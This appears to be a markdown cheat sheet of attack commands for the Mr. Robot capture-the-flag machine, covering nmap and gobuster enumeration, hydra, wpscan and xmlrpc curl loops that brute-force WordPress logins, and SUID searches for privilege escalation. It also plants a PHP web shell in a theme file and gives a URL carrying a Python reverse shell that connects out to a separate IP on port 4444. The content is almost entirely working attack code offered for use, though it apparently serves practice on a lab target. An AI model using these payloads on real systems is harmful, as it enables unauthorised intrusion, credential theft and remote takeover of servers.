### How to scan ports with nmap
```bash
IP_ADDR=
nmap -sV -sC -oA initial $IP_ADDR
```
### How to enumerate web server directories
```bash
WORDLISTS=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   
gobuster dir -u http://${IP_ADDR} -w ${WORDLISTS} -t 100 -q -o gobuster.txt
```
## How to filter unique string
```bash
wc -l fsocity.dic # number of lines
sort fsocity.dic | uniq | wc -l # unique words
sort fsocity.dic | uniq > example_filtered.txt
```
### A LOTL attack 
```bash
username="admin"
password="password"
for pass in $(cat passwords.txt); do curl -s -X POST -d "<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$pass</value></param></params></methodCall>" http://10.10.6.115/xmlrpc.php | grep -q 'Incorrect username or password.' || echo "Found credentials: $username:$pass"; done
```
### How to bruteforce input fields with hydra
Username
```bash
IP_ADDR=
hydra -L fsocity.dic -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
hydra -L fsocity.di -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:Invalid Username" -t 30
```
Password
```bash
IP_ADDR=
hydra -l elliot -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP_ADDR%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```
### How to bruteforce input fields with wpscan
```bash
wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
```
### How to reverse shell
https://github.com/pentestmonkey/php-reverse-shell
```bash
nc -lvnp 4444
```
### Reverse shell using cmd
archive.php
```bash
<?php
if (isset($_GET['cmd'])) {
    passthru($_GET['cmd']);
}
?>
```
on the URL
```bash
http://3.95.226.44/wp-content/themes/twentyfifteen/archive.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.80.82.197",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### How to escalate priv with SUID bit set
https://gtfobins.github.io/gtfobins/nmap/
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm +6000 2>/dev/null | grep '/bin/'
```
### How to hack xmlrpc
https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
### Resource
https://www.blackhillsinfosec.com/hacking-with-hydra/

https://blog.christophetd.fr/write-up-mr-robot/

https://medium.com/@hackermentor/vulnhub-mr-robot-walkthrough-9309702b8e8
